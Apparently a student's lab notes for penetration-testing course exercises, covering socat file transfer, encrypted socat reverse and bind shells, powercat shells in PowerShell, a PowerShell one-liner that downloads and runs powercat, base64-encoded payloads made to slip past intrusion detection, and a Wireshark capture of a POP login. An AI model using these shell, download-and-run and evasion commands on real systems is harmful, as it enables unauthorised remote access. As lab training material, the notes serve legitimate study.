# 4.2.5 exercises
#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Use **socat ** to transfer **powercat.ps1 ** from your Kali machine to your Windows system. Keep the file on your system for use in the next section.
host
`sudo socat TCP4-LISTEN:443,fork file:powercat.ps1`
recipient
`socat TCP4:192.168.119.249:443 file:received_powercat.ps1,create`
![[Pasted image 20220218121253.png]]

2.  Use **socat ** to create an encrypted reverse shell from your Windows system to your Kali machine.
generate the key
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
combine .key and .crt into .pem
`cat bind_shell.key bind_shell.crt > bind_shell.pem`
create listener using .pem and execute shell
`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
connect 
`socat - OPENSSL:192.168.119.249:443,verify=0`
![[Pasted image 20220218122213.png]]
# !!SKIPPED QUESTIONS RETURN HERE!!
3.  Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?
use previously generated .pem
start socat listener
`socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0 STDOUT`
target windows machine do a callback using socat
`socat OPENSSL:192.168.119.218:443,verify=0 EXEC:/bin/bash`

4.  Make an unencrypted **socat ** bind shell on your Windows system. Connect to the shell using Netcat. Does it work?


# 4.3.9 exercises
#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Use **PowerShell** and **powercat** to create a reverse shell from your Windows system to your Kali machine.
run dot-sourcing script
`. .\powercat.ps1`
or use iex cmdlet
`iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
start listener on local machine
`nc -lnvp 9999`
use powershell on remote machine to connect to listener
`powercat -c <IP> -p <PORT> -e cmd.exe`
![[Pasted image 20220218171345.png]]
![[Pasted image 20220218171401.png]]
2.  Use **PowerShell** and **powercat** to create a bind shell on your Windows system and connect to it from your Kali machine. Can you also use **powercat** to connect to it locally?
create bind shell in powershell with powercat
`powercat -l -p 443 -e cmd.exe`
connect with nc on local machine
`nc -nv <IP> <PORT>`
to connect locally using powercat simply run powercat with -c flag in seperate terminal
`powercat -c 127.0.0.1 -p <PORT> `

3.  Use **powercat** to generate an encoded payload and then have it executed through **powershell**. Have a reverse shell sent to your Kali machine, also create an encoded bind shell on your Windows system and use your Kali machine to connect to it.
generate powercat payload
`powercat -c <IP> -p <PORT> -e cmd.exe -g > reverseshell.ps1`
or encade in base64 to avoid IDS
`powercat -c <IP> -p <PORT> -e cmd.exe -ge > encoded_reverseshell.ps1`
start listener on local machine
`nc -lnvp <PORT>`
start reverse shell by running .ps1 file
`.\reversehell.ps1`
or if encoded, running posershell.exe with -E flag and encoded payload
`powershell.exe -E <ENCODED_PAYLOAD_HERE>`
###### easy copy/paste in powershell
`Get-Content C:\Users\user1\.ssh\id_ed25519.pub | Set-Clipboard`
![[Pasted image 20220218173555.png]]
![[Pasted image 20220218173813.png]]

# exercises 4.4.6
#### Exercises

_(To be performed on your own Kali machine - Reporting is required for these exercises)_

1.  Use Wireshark to capture network activity while attempting to connect to 10.11.1.217 on port 110 using Netcat, and then attempt to log into it.
setup filter to only capture traffic on port 110
connect to pop server via nc
`nc -nv <IP> 110`
attempt to log into pop server 
`USER student`
`PASS lab`
![[Pasted image 20220218183021.png]]
2.  Read and understand the output. Where is the three-way handshake happening? Where is the connection closed?
Frame 1, 2, and 3 contain the three-way handshake
![[Pasted image 20220218183223.png]]
frame 13 contains RST, ack which is used to reset/shutdown a connection
![[Pasted image 20220218183755.png]]

3.  Follow the TCP stream to read the login attempt.
![[Pasted image 20220218183815.png]]

4.  Use the display filter to only monitor traffic on port 110.
this can be done one the startup page via the capture filter
![[Pasted image 20220218183859.png]]
or with the display filter once the capture has begun
![[Pasted image 20220218184037.png]]

5.  Run a new session, this time using the capture filter to only collect traffic on port 110.
see above section for capture filtering